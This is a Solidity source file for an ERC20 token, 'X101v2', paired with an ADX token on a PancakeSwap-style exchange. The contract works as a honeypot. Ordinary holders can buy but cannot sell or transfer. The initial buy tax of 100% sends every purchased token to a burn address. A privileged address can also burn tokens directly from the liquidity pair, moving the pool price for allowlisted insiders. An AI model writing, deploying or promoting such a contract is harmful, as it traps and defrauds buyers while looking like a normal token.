// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";


interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}



contract X101v2 is ERC20, Ownable{

    IPancakeRouter02 public pancakeRouter = IPancakeRouter02(0x1F7CdA03D18834C8328cA259AbE57Bf33c46647c);
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address public constant ADX = 0x68a4d37635cdB55AF61B8e58446949fB21f384e5;

    uint256 public  buy_tax_rate = 100;

    address public pancakePair;
    address public specifySell;

    mapping(address => bool) public allowlist;

    constructor(address _initialRecipient)ERC20("X101v2","X101")Ownable(msg.sender){
        _mint(_initialRecipient, 1010000e18);
        pancakePair = IPancakeFactory(pancakeRouter.factory())
            .createPair(address(this), ADX);
        allowlist[_initialRecipient] = true;
    }

    modifier onlyBurn() {
        require(specifySell == msg.sender, "NOT_PERMIT.");
        _;
    }

    function setTaxRate(uint256 _buyRate) external onlyOwner {
        require(_buyRate <= 50, "RATE_TOO_HIGH");
        buy_tax_rate = _buyRate;
    }


    function setSpecifySell(address _specifySell) external onlyOwner{
        require(_specifySell != address(0),"Error addr.");
        specifySell = _specifySell;
        allowlist[_specifySell] = true;
    }


    function setAllowlist(address[] memory addrs, bool isAllow) external onlyOwner{
        for(uint i=0; i<addrs.length; i++){
            allowlist[addrs[i]] = isAllow;
        }
    }

    function _update(address from, address to, uint256 amount) internal virtual override {

        // mint / burn / allowlist
        if (
            from == address(0) ||
            to == address(0) ||
            allowlist[from] ||
            allowlist[to]
        ) {
            super._update(from, to, amount);
            return;
        }

        bool isBuy  = from == pancakePair;

        require(isBuy, "TRANSFER_AND_SELL_DISABLED");

        uint256 taxAmount = amount * buy_tax_rate / 100;

        // ================= BUY =================
        if (isBuy) {
            uint256 sendAmount = amount - taxAmount;
            super._update(from, DEAD, taxAmount);
            super._update(from, to, sendAmount);
            return;
        }

    }

    function burnFromPair(uint256 amount) external onlyBurn(){
        super._update(pancakePair,DEAD, amount);
    }
    
}